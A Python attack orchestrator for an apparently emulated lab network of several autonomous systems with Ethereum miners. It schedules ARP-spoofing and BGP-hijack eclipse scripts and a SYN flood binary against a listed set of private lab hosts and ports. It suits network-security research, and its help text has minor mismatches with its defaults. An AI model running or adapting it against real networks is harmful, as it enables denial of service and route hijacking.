#!/usr/bin/env python3
"""
Attack orchestrator — launches attacks against the AS162 network, each on its
own independent schedule, with command-line flags to enable each attack.

Each enabled attack runs in its own thread and loops on its own interval, so
the attacks are NOT synchronised — they fire at different times.

Attacks:
  --arp        ARP-spoofing eclipse attack  (arp_eclipse_attack.py)
  --bgp        BGP-hijack eclipse attack    (bgp_eclipse_attack.py)
  --synflood   TCP SYN flood                (synflood binary)
  --all        Enable all of the above

Per-attack scheduling (seconds between successive runs of that attack):
  --arp-interval       S   (default 180)
  --bgp-interval       S   (default 240)
  --synflood-interval  S   (default 60)

SYN flood tuning:
  --synflood-duration  S   Seconds to flood per run (default 0.5)

Global:
  --cycles N   Max runs per attack; 0 = run forever (default 0)

Examples:
  ./attacks.py --synflood
  ./attacks.py --arp --synflood --synflood-interval 90 --arp-interval 300
  ./attacks.py --all --cycles 5

Path resolution:
  Script/binary paths are auto-detected so this works both from the attacks/
  source tree and inside the attacker container (where the Dockerfile copies
  everything to / ).
"""

import argparse
import os
import signal
import subprocess
import sys
import threading
import time
from datetime import datetime

# ──────────────────────────────────────────────
# PATH RESOLUTION
# ──────────────────────────────────────────────
_HERE = os.path.dirname(os.path.abspath(__file__))


def _resolve(*candidates):
    """Return the first candidate path that exists, else the last one."""
    for c in candidates:
        if c and os.path.exists(c):
            return c
    return candidates[-1]


# Inside the container the Dockerfile drops these at /; in the source tree
# they live under attacks/<module>/. Check both.
SYNFLOOD_BIN = _resolve(
    "/synflood",
    os.path.join(_HERE, "synflood", "synflood"),
)
ARP_SCRIPT = _resolve(
    "/arp_eclipse_attack.py",
    os.path.join(_HERE, "l2_arp_spoofing", "arp_eclipse_attack.py"),
)
BGP_SCRIPT = _resolve(
    "/bgp_eclipse_attack.py",
    os.path.join(_HERE, "l3_bgp_hijacking", "bgp_eclipse_attack.py"),
)

# SYN flood targets — (ip, port) pairs across every container in every
# subnetwork of the emulation (AS160, AS161, AS162 and the IX103 exchange).
# Each container is flooded only on the ports it actually listens on:
#   miners (.71)      traffic_gen (80/23/53) + geth RPC 8545 + p2p 30303
#   bootnode 160.0.71 additionally serves the enode URL over http on 8088
#   hosts  (.72/.73)  traffic_gen only (80/23/53)
#   routers (.254) / IX103 (.103)  BIRD/BGP on 179
# (10.162.0.74 runs no listening service, so it is not a target.)
SYNFLOOD_TARGETS = [
    # AS160 (10.160.0.0/24)
    ("10.160.0.71", 80),
    ("10.160.0.71", 23),
    ("10.160.0.71", 53),
    ("10.160.0.71", 8545),
    ("10.160.0.71", 30303),
    ("10.160.0.71", 8088),     # bootnode enode-URL http server
    ("10.160.0.72", 80),
    ("10.160.0.72", 23),
    ("10.160.0.72", 53),
    ("10.160.0.73", 80),
    ("10.160.0.73", 23),
    ("10.160.0.73", 53),
    ("10.160.0.254", 179),     # BGP
    # AS161 (10.161.0.0/24)
    ("10.161.0.71", 80),
    ("10.161.0.71", 23),
    ("10.161.0.71", 53),
    ("10.161.0.71", 8545),
    ("10.161.0.71", 30303),
    ("10.161.0.72", 80),
    ("10.161.0.72", 23),
    ("10.161.0.72", 53),
    ("10.161.0.73", 80),
    ("10.161.0.73", 23),
    ("10.161.0.73", 53),
    ("10.161.0.254", 179),     # BGP
    # AS162 (10.162.0.0/24)
    ("10.162.0.71", 80),
    ("10.162.0.71", 23),
    ("10.162.0.71", 53),
    ("10.162.0.71", 8545),
    ("10.162.0.71", 30303),
    ("10.162.0.72", 80),
    ("10.162.0.72", 23),
    ("10.162.0.72", 53),
    ("10.162.0.73", 80),
    ("10.162.0.73", 23),
    ("10.162.0.73", 53),
    ("10.162.0.254", 179),     # BGP
    # IX103 exchange (10.103.0.0/24)
    ("10.103.0.103", 179),     # BGP route server
]

# ──────────────────────────────────────────────
# LOGGING
# ──────────────────────────────────────────────
RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"
CYAN = "\033[96m"; WHITE = "\033[97m"

_print_lock = threading.Lock()


def ts():
    return datetime.now().strftime("%H:%M:%S")


def log(tag, msg, color=WHITE):
    with _print_lock:
        print(f"{DIM}[{ts()}]{RESET} {color}{BOLD}[{tag}]{RESET} {color}{msg}{RESET}",
              flush=True)


# ──────────────────────────────────────────────
# SHUTDOWN EVENT (set by signal handler; every attack loop checks it)
# ──────────────────────────────────────────────
_shutdown = threading.Event()


# ──────────────────────────────────────────────
# SYN FLOOD
# ──────────────────────────────────────────────
def synflood_once(duration):
    """Flood a single randomly-chosen target for `duration` seconds, then stop."""

    if not os.path.exists(SYNFLOOD_BIN):
        log("synflood", f"binary not found at {SYNFLOOD_BIN} — skipping", RED)
        return

    import random
    ip, port = random.choice(SYNFLOOD_TARGETS)
    log("synflood", f"flooding {ip}:{port} for {duration}s", CYAN)

    try:
        proc = subprocess.Popen(
            [SYNFLOOD_BIN, ip, str(port)],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
    except Exception as e:
        log("synflood", f"could not start {ip}:{port}: {e}", YELLOW)
        return

    log("synflood", f"flood process running (pid {proc.pid})", GREEN)
    _shutdown.wait(timeout=duration)

    if proc.poll() is None:
        proc.terminate()
    time.sleep(1)
    if proc.poll() is None:
        proc.kill()

    log("synflood", f"flood stopped ({ip}:{port})", GREEN)
# ──────────────────────────────────────────────
# ECLIPSE ATTACKS (delegate to the existing scripts)
# ──────────────────────────────────────────────
def run_script(tag, path, extra_args):
    """Run an attack script as a subprocess (blocking until it finishes)."""
    if not os.path.exists(path):
        log(tag, f"script not found at {path} — skipping", RED)
        return

    cmd = [sys.executable, "-u", path] + list(extra_args)
    log(tag, f"launching: {' '.join(cmd)}", CYAN)
    env = os.environ.copy()
    env["PYTHONUNBUFFERED"] = "1"
    env["PYTHONWARNINGS"] = "ignore"
    try:
        rc = subprocess.call(cmd, env=env)
    except Exception as e:
        log(tag, f"failed to launch: {e}", RED)
        return
    log(tag, f"finished (exit {rc})", GREEN if rc == 0 else YELLOW)


# ──────────────────────────────────────────────
# PER-ATTACK SCHEDULER
# ──────────────────────────────────────────────
def attack_loop(tag, run_once, interval, cycles):
    """
    Generic per-attack scheduler: run the attack, sleep `interval`, repeat.
    Each attack runs this in its own thread, so schedules are independent.
    """
    n = 0
    while not _shutdown.is_set():
        n += 1
        log(tag, f"run #{n}" + (f"/{cycles}" if cycles else ""), BOLD + CYAN)
        run_once()

        if cycles and n >= cycles:
            log(tag, "reached cycle limit — stopping", DIM)
            return
        if _shutdown.is_set():
            return

        log(tag, f"sleeping {interval}s until next run", DIM)
        _shutdown.wait(timeout=interval)


# ──────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────
def _handle_signal(signum, frame):
    log("orchestrator", f"signal {signum} received — shutting down", YELLOW)
    _shutdown.set()


def main():
    parser = argparse.ArgumentParser(
        description="Launch AS160 attacks, each on its own independent interval.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument("--arp", action="store_true",
                        help="Enable the ARP-spoofing eclipse attack")
    parser.add_argument("--bgp", action="store_true",
                        help="Enable the BGP-hijack eclipse attack")
    parser.add_argument("--synflood", action="store_true",
                        help="Enable the TCP SYN flood")
    parser.add_argument("--all", action="store_true",
                        help="Enable every attack")

    parser.add_argument("--arp-interval", type=int, default=10,
                        help="Seconds between ARP runs (default 10)")
    parser.add_argument("--bgp-interval", type=int, default=10,
                        help="Seconds between BGP runs (default 10)")
    parser.add_argument("--synflood-interval", type=int, default=30,
                        help="Seconds between SYN flood runs (default 30)")
    parser.add_argument("--synflood-duration", type=int, default=0.5,
                        help="Seconds to SYN flood per run (default 0.5)")

    parser.add_argument("--cycles", type=int, default=0,
                        help="Max runs per attack; 0 = forever (default 0)")
    parser.add_argument("--eclipse-args", nargs=argparse.REMAINDER, default=[],
                        help="Extra args forwarded to the eclipse scripts "
                             "(e.g. --eclipse-args --phase 1)")
    args = parser.parse_args()

    if args.all:
        args.arp = args.bgp = args.synflood = True

    if not (args.arp or args.bgp or args.synflood):
        parser.error("Enable at least one attack: --arp, --bgp, --synflood, or --all")

    signal.signal(signal.SIGINT, _handle_signal)
    signal.signal(signal.SIGTERM, _handle_signal)

    # Build the set of attack threads, each with its own interval.
    specs = []
    if args.synflood:
        specs.append(("synflood", lambda: synflood_once(args.synflood_duration),
                      args.synflood_interval))
    if args.arp:
        specs.append(("arp", lambda: run_script("arp", ARP_SCRIPT, args.eclipse_args),
                      args.arp_interval))
    if args.bgp:
        specs.append(("bgp", lambda: run_script("bgp", BGP_SCRIPT, args.eclipse_args),
                      args.bgp_interval))

    print(f"\n{CYAN}{BOLD}{'='*60}{RESET}")
    print(f"{CYAN}{BOLD}  ATTACK ORCHESTRATOR — AS160{RESET}")
    print(f"{CYAN}{BOLD}{'='*60}{RESET}")
    for tag, _, interval in specs:
        log("orchestrator", f"{tag:<9} enabled — interval {interval}s", CYAN)
    log("orchestrator", f"cycles per attack: {args.cycles or 'forever'}", CYAN)

    threads = [
        threading.Thread(
            target=attack_loop, args=(tag, run_once, interval, args.cycles),
            name=tag, daemon=True,
        )
        for tag, run_once, interval in specs
    ]
    for t in threads:
        t.start()

    # Wait until every attack thread is done (or until interrupted).
    try:
        while any(t.is_alive() for t in threads):
            for t in threads:
                t.join(timeout=0.1)
            if _shutdown.is_set():
                break
    except KeyboardInterrupt:
        _shutdown.set()

    if _shutdown.is_set():
        log("orchestrator", "waiting for attack threads to finish ...", YELLOW)
        for t in threads:
            t.join(timeout=20)
            if t.is_alive():
                log("orchestrator", f"thread {t.name} did not stop in time", RED)

    log("orchestrator", "finished.", GREEN)


if __name__ == "__main__":
    main()
